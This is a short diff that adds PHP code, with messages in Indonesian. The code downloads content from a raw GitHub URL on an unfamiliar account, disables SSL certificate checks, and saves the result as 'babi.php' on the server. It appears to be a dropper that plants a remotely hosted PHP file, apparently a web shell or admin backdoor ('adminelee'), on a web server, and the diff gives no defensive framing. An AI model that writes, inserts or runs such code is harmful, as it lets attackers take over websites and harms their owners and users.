@@ -1,0 +1,21 @@
+$url = 'https://raw.githubusercontent.com/sunggalbedor-cmyk/pektol/refs/heads/main/adminelee';
+$filename = 'babi.php';
+
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Jika ada masalah SSL
+
+$content = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($httpCode == 200 && $content !== false) {
+    if (file_put_contents($filename, $content)) {
+        echo "File '$filename' berhasil dibuat!";
+    } else {
+        echo "Gagal menyimpan file";
+    }
+} else {
+    echo "Gagal mengambil konten (HTTP Code: $httpCode)";
+}
